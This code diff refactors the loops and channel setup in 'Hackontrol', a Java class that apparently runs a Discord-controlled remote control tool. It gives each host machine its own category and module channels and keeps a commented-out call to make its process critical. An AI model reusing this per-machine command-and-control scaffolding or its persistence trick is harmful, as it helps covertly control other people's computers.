@@ -56,14 +56,14 @@ public class Hackontrol {
 		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
 		this.moduleList = ClassRegistration.list(null, Hackontrol.MODULE_REGISTRY);
 
-		for(int i = 0; i < this.moduleList.size(); i++) {
-			Hackontrol.LOGGER.info("Registered module: {}", this.moduleList.get(i).getClass().getName());
+		for(Module module : this.moduleList) {
+			Hackontrol.LOGGER.info("Registered module: {}", module.getClass().getName());
 		}
 
 		JDABuilder builder = JDABuilder.createDefault(Information.getToken()).enableIntents(GatewayIntent.MESSAGE_CONTENT);
 
-		for(int i = 0; i < this.managerList.size(); i++) {
-			this.managerList.get(i).configureBuilder(builder);
+		for(Manager manager : this.managerList) {
+			manager.configureBuilder(builder);
 		}
 
 		this.bot = builder.build();
@@ -76,10 +76,23 @@ public class Hackontrol {
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Information.getMachineName();
-		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
+		String categoryName = this.machineIdentifier.toLowerCase();
+		Category category = null;
 
-		for(int i = 0; i < this.moduleList.size(); i++) {
-			Module module = this.moduleList.get(i);
+		for(Category entry : this.guild.getCategories()) {
+			if(entry.getName().toLowerCase().contains(categoryName)) {
+				category = entry;
+				break;
+			}
+		}
+
+		if(category == null) {
+			category = this.guild.createCategory(categoryName).complete();
+		}
+
+		this.category = category;
+
+		for(Module module : this.moduleList) {
 			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, module.getName());
 			module.hackontrol = this;
 			module.category = this.category;
@@ -93,8 +106,7 @@ public class Hackontrol {
 			module.postInitialize();
 		}
 
-		for(int i = 0; i < this.managerList.size(); i++) {
-			Manager manager = this.managerList.get(i);
+		for(Manager manager : this.managerList) {
 			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
 			manager.initialize();
 		}
@@ -102,32 +114,17 @@ public class Hackontrol {
 		//Kernel.setProcessCritical(true);
 	}
 
-	private Category getOrCreateCategory(Guild guild, String name) {
-		for(Category category : guild.getCategories()) {
-			if(category.getName().toLowerCase().contains(name.toLowerCase())) {
-				return category;
-			}
-		}
-
-		return guild.createCategory(name).complete();
-	}
-
 	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
-		List<TextChannel> list = category.getTextChannels();
-		boolean hasChannel = false;
 		TextChannel targetChannel = null;
 
-		for(int i = 0; i < list.size(); i++) {
-			TextChannel channel = list.get(i);
-
+		for(TextChannel channel : category.getTextChannels()) {
 			if(channel.getName().equalsIgnoreCase(name)) {
-				hasChannel = true;
 				targetChannel = channel;
 				break;
 			}
 		}
 
-		if(hasChannel) {
+		if(targetChannel != null) {
 			return targetChannel;
 		}
 
@@ -154,9 +151,7 @@ public class Hackontrol {
 			throw new NullPointerException("Manager class cannot be null");
 		}
 
-		for(int i = 0; i < this.managerList.size(); i++) {
-			Manager manager = this.managerList.get(i);
-
+		for(Manager manager : this.managerList) {
 			if(managerClass.isAssignableFrom(manager.getClass())) {
 				return (T) manager;
 			}
@@ -175,9 +170,7 @@ public class Hackontrol {
 			throw new NullPointerException("Module class cannot be null");
 		}
 
-		for(int i = 0; i < this.moduleList.size(); i++) {
-			Module module = this.moduleList.get(i);
-
+		for(Module module : this.moduleList) {
 			if(moduleClass.isAssignableFrom(module.getClass())) {
 				return (T) module;
 			}
@@ -191,9 +184,7 @@ public class Hackontrol {
 			throw new NullPointerException("Text channel cannot be null");
 		}
 
-		for(int i = 0; i < this.moduleList.size(); i++) {
-			Module module = this.moduleList.get(i);
-
+		for(Module module : this.moduleList) {
 			if(textChannel.equals(module.channel)) {
 				return module;
 			}
